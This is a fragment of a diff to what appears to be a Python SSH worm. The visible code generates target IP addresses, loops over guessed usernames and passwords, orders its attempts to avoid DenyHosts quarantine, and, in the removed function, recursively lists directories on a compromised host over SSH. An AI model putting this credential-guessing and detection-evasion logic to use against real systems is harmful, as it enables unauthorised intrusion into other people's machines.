@@ -200,16 +200,6 @@ def get_fresh_ipaddresses(how_many):
 # names and passwords consecutively since we do not want to be quarantined 
 # by a tool like DenyHosts at the other end.  So let's reverse the order 
 # of looping.
-def process_directories(ssh, remote_directory):
-    stdin, stdout, stderr = ssh.exec_command('find {} -type d'.format(remote_directory))
-    subdirectories = list(map(lambda x: x.strip().encode('utf-8'), stdout.readlines()))
-
-    for subdirectory in subdirectories:
-        process_file(subdirectory)
-
-    for subdirectory in subdirectories:
-        process_directories(ssh, subdirectory)
-
 while True:
     usernames = get_new_usernames(NUSERNAMES)
     passwds =   get_new_passwds(NPASSWDS)
